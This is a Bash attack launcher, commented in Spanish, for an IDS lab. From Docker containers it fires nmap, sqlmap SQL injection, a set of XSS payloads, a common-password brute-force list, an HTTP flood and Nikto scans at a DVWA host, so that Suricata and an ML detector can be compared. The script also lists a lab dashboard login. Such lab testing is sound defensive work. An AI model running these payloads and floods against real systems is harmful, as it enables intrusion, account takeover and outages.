#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════
# Lab IDS-ML — Lanzador de ataques contra DVWA (172.25.0.50)
# Los ataques corren DESDE un container temporal en ids_network
# para que Suricata los vea por el bridge (visibilidad garantizada).
# ═══════════════════════════════════════════════════════════════
set -u

TARGET="172.25.0.50"
NETWORK="ids-lab_ids_network"
RESET='\033[0m'; GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; BOLD='\033[1m'

usage() {
    cat <<EOF
${BOLD}Uso:${RESET}  ./attack.sh <ataque>

${BOLD}Ataques disponibles:${RESET}
  ${GREEN}nmap${RESET}        Port scan TCP SYN + http-enum  (~10s)
  ${GREEN}sqli${RESET}        sqlmap automated SQL injection contra DVWA  (~30s)
  ${GREEN}xss${RESET}         Reflected XSS payloads variados  (~5s)
  ${GREEN}bruteforce${RESET}  30 intentos login DVWA  (~10s)
  ${GREEN}dos${RESET}         hey: 500 req @ 50 concurrent  (~30s)
  ${GREEN}recon${RESET}       Nikto vulnerability scanner  (~30-60s)
  ${GREEN}nikto-quick${RESET} Nikto solo headers + dirs comunes  (~15s)
  ${GREEN}all${RESET}         Ejecuta TODOS en secuencia  (~2 min)

${BOLD}Para ver alertas en vivo (otra terminal):${RESET}
  tail -f /opt/ids-lab/logs/eve.json | grep --line-buffered '"event_type":"alert"' \\
    | jq -r '"\\(.timestamp[0:19]) [\\(.alert.severity)] \\(.src_ip) → \\(.dest_ip):\\(.dest_port) | \\(.alert.signature)"'

${BOLD}Dashboard:${RESET}  http://192.168.122.10/  (lab/ids2026) → tab "Suricata vs ML"
EOF
}

[ $# -lt 1 ] && { usage; exit 1; }

ATTACK="$1"

run_attack() {
    local name="$1"; shift
    printf "\n${BOLD}${BLUE}▸ Lanzando: ${name}${RESET}\n"
    "$@"
    printf "${GREEN}✓ Ataque '${name}' completado${RESET}\n"
}

attack_nmap() {
    docker run --rm --network "$NETWORK" instrumentisto/nmap \
        -sS -sV -T4 -p 20-100 --script=http-enum "$TARGET" 2>&1 | tail -25
}

# SQLi via sqlmap (real, automatizado, dispara firmas Suricata)
attack_sqli() {
    docker run --rm --network "$NETWORK" googlesky/sqlmap:latest \
        -u "http://$TARGET/vulnerabilities/sqli/?id=1" \
        --batch --level=3 --risk=2 --threads=4 --timeout=15 \
        --random-agent 2>&1 | tail -15
}

# XSS via curl con --data-urlencode (sin shell parsing issues)
attack_xss() {
    docker run --rm --network "$NETWORK" curlimages/curl:latest sh -s <<'INNER'
TARGET="172.25.0.50"
PAYLOADS='<script>alert(1)</script>
<img src=x onerror=alert(1)>
javascript:alert(document.cookie)
<svg onload=alert(1)>
"><script>alert(String.fromCharCode(88,83,83))</script>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
<a href="javascript:alert(1)">click</a>'
COUNT=0
while IFS= read -r p; do
    for ep in vulnerabilities/xss_r vulnerabilities/xss_s; do
        curl -sS -o /dev/null -G \
            --data-urlencode "name=$p" \
            "http://$TARGET/$ep/" &
        COUNT=$((COUNT+1))
    done
done <<< "$PAYLOADS"
wait
echo "$COUNT XSS requests enviados"
INNER
}

# Bruteforce con curl + URL encoding
attack_bruteforce() {
    docker run --rm --network "$NETWORK" curlimages/curl:latest sh -s <<'INNER'
TARGET="172.25.0.50"
PASSWORDS="admin password 123456 letmein qwerty root toor admin123 password123 dvwa hello welcome master access changeme default secret test demo guest user pass abc123 monkey dragon football iloveyou 1234 12345 superman mustang shadow"
COUNT=0
for pw in $PASSWORDS; do
    curl -sS -o /dev/null -L \
        -c /tmp/c -b /tmp/c \
        --data-urlencode "username=admin" \
        --data-urlencode "password=$pw" \
        --data-urlencode "Login=Login" \
        "http://$TARGET/login.php" &
    COUNT=$((COUNT+1))
done
wait
echo "$COUNT login attempts enviados"
INNER
}

attack_dos() {
    docker run --rm --network "$NETWORK" \
        williamyeh/hey:latest -n 500 -c 50 "http://$TARGET/" 2>&1 | tail -15
}

attack_recon() {
    docker run --rm --network "$NETWORK" \
        sullo/nikto -h "http://$TARGET" -maxtime 60 -Tuning 1234567 2>&1 | tail -30
}

attack_nikto_quick() {
    docker run --rm --network "$NETWORK" \
        sullo/nikto -h "http://$TARGET" -maxtime 15 -Tuning 12 2>&1 | tail -20
}

case "$ATTACK" in
    nmap)        run_attack "nmap port scan" attack_nmap ;;
    sqli)        run_attack "SQL injection (sqlmap)" attack_sqli ;;
    xss)         run_attack "XSS payloads" attack_xss ;;
    bruteforce)  run_attack "Brute force login" attack_bruteforce ;;
    dos)         run_attack "DoS / HTTP flood" attack_dos ;;
    recon)       run_attack "Nikto recon" attack_recon ;;
    nikto-quick) run_attack "Nikto quick" attack_nikto_quick ;;
    all)
        run_attack "nmap" attack_nmap
        run_attack "sqli" attack_sqli
        run_attack "xss" attack_xss
        run_attack "bruteforce" attack_bruteforce
        run_attack "dos" attack_dos
        run_attack "nikto-quick" attack_nikto_quick
        ;;
    *)  printf "${RED}Ataque desconocido:${RESET} %s\n\n" "$ATTACK"; usage; exit 1 ;;
esac

printf "\n${BOLD}${YELLOW}▸ Revisar resultados:${RESET}\n"
printf "  Alertas Suricata: ${BOLD}grep -c '\"event_type\":\"alert\"' /opt/ids-lab/logs/eve.json${RESET}\n"
printf "  Dashboard:        ${BOLD}http://192.168.122.10/${RESET} → tab 'Suricata vs ML'\n"
